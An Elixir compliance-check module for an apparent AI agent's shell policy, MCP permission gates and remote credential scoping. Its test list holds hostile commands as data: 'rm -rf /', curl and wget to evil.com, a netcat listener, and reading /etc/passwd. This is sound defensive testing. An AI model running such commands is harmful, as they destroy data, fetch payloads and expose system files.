defmodule Tet.Security.ComplianceSuite.Checks.TrustBoundary do
  @moduledoc """
  Trust boundary compliance checks — BD-0070.

  Shell command injection, MCP trust boundary, and remote credential scoping.
  """

  alias Tet.ShellPolicy
  alias Tet.Mcp.Classification
  alias Tet.Mcp.PermissionGate
  alias Tet.Mcp.CallPolicy
  alias Tet.Remote.TrustBoundary
  alias Tet.Remote.EnvPolicy
  alias Tet.Security.ComplianceSuite.Checks.Helpers

  @doc "Checks that shell policy blocks unknown executables and dangerous commands."
  @spec check_shell_injection() :: Tet.Security.ComplianceSuite.check_result()
  def check_shell_injection do
    blocked_commands = [
      {["rm", "-rf", "/"], :unknown_executable},
      {["curl", "http://evil.com"], :unknown_executable},
      {["bash", "-c", "whoami"], :unknown_executable},
      {["python3", "-c", "import os"], :unknown_executable},
      {["sh", "-c", "cat /etc/passwd"], :unknown_executable},
      {["chmod", "777", "/tmp"], :unknown_executable},
      {["sudo", "rm", "-rf", "/"], :unknown_executable},
      {["nc", "-l", "4444"], :unknown_executable},
      {["wget", "http://evil.com/payload"], :unknown_executable},
      {[""], :unknown_executable},
      {[], :empty_vector}
    ]

    allowed_commands = [
      ["git", "status"],
      ["git", "log"],
      ["mix", "test"],
      ["mix", "compile"],
      ["mix", "format"]
    ]

    block_failures =
      blocked_commands
      |> Enum.reject(fn {cmd, expected_reason} ->
        case ShellPolicy.check_command(cmd) do
          {:error, {_, ^expected_reason}} -> true
          {:error, _other} -> false
          {:ok, _risk} -> false
        end
      end)
      |> Enum.map(fn {cmd, expected} ->
        case ShellPolicy.check_command(cmd) do
          {:ok, risk} ->
            %{command: cmd, risk: risk, reason: :should_have_been_blocked, expected: expected}

          {:error, other} ->
            %{command: cmd, expected: expected, got: other, reason: :unexpected_rejection}
        end
      end)

    allow_failures =
      allowed_commands
      |> Enum.reject(fn cmd -> match?({:ok, _}, ShellPolicy.check_command(cmd)) end)
      |> Enum.map(fn cmd ->
        {:error, reason} = ShellPolicy.check_command(cmd)
        %{command: cmd, reason: reason, expected: :allowed, got: :blocked}
      end)

    failures = block_failures ++ allow_failures

    Helpers.build_result(:shell_injection, failures, %{
      blocked_tested: length(blocked_commands),
      allowed_tested: length(allowed_commands)
    })
  end

  @doc "Checks that MCP classification and permission gates enforce trust boundaries."
  @spec check_mcp_trust() :: Tet.Security.ComplianceSuite.check_result()
  def check_mcp_trust do
    tests = [
      {:self_downgrade,
       fn -> Classification.classify(%{name: "run_bash", mcp_category: :read}) == :shell end},
      {:unknown_default, fn -> Classification.classify(%{name: "xyzzy_unknown"}) == :write end},
      {:shell_never_safe,
       fn ->
         for task <- [:researching, :planning, :acting, :verifying, :debugging] do
           not PermissionGate.safe_for_task?(:shell, %{task_category: task})
         end
         |> Enum.all?()
       end},
      {:admin_never_safe,
       fn ->
         for task <- [:researching, :planning, :acting, :verifying, :debugging] do
           not PermissionGate.safe_for_task?(:admin, %{task_category: task})
         end
         |> Enum.all?()
       end},
      {:blocked_categories_denied,
       fn ->
         blocked_policy = CallPolicy.new!(%{blocked_categories: [:shell, :admin, :network]})
         ctx = %{task_category: :acting}

         for cat <- [:shell, :admin, :network] do
           match?({:ok, :deny}, PermissionGate.check(cat, ctx, blocked_policy))
         end
         |> Enum.all?()
       end},
      {:network_only_safe_in_acting,
       fn ->
         for task <- [:researching, :verifying, :debugging, :planning] do
           not PermissionGate.safe_for_task?(:network, %{task_category: task})
         end
         |> Enum.all?()
       end}
    ]

    failures = Helpers.run_assertions(tests)
    Helpers.build_result(:mcp_trust, failures, %{tests_run: length(tests)})
  end

  @doc "Checks that remote trust boundaries and env policies prevent credential leakage."
  @spec check_remote_credential_scoping() :: Tet.Security.ComplianceSuite.check_result()
  def check_remote_credential_scoping do
    tests = [
      {:untrusted_sees_nothing,
       fn ->
         secret_scope = %{ref: "db-password", min_trust: :trusted_remote}

         match?(
           {:error, {:secret_access_denied, :untrusted_remote_no_secrets}},
           TrustBoundary.check_secret_access(:untrusted_remote, secret_scope)
         )
       end},
      {:untrusted_ops_denied,
       fn ->
         for op <- TrustBoundary.trusted_remote_operations() do
           match?(
             {:error, {:trust_violation, _}},
             TrustBoundary.check_operation(:untrusted_remote, op)
           )
         end
         |> Enum.all?()
       end},
      {:env_rejects_secret_names,
       fn ->
         for name <- ["AWS_SECRET_ACCESS_KEY", "DATABASE_PASSWORD", "API_TOKEN", "PRIVATE_KEY"] do
           match?({:error, {:secret_name, ^name}}, EnvPolicy.validate_allowlist([name]))
         end
         |> Enum.all?()
       end},
      {:env_filter_drops_secret_keys,
       fn ->
         env = %{"AWS_SECRET_ACCESS_KEY" => "super-secret", "PATH" => "/usr/bin"}
         {:ok, allowlist} = EnvPolicy.validate_allowlist(["HOME", "PATH"])
         filtered = EnvPolicy.filter_env(env, allowlist)
         not Map.has_key?(filtered, "AWS_SECRET_ACCESS_KEY")
       end},
      {:trusted_remote_accesses_scoped_secrets,
       fn ->
         trusted_scope = %{ref: "deploy-key", min_trust: :trusted_remote}
         TrustBoundary.check_secret_access(:trusted_remote, trusted_scope) == :ok
       end},
      {:trusted_remote_denied_local_secrets,
       fn ->
         local_scope = %{ref: "root-key", min_trust: :local}

         match?(
           {:error, {:secret_access_denied, _}},
           TrustBoundary.check_secret_access(:trusted_remote, local_scope)
         )
       end}
    ]

    failures = Helpers.run_assertions(tests)
    Helpers.build_result(:remote_credential, failures, %{tests_run: length(tests)})
  end
end
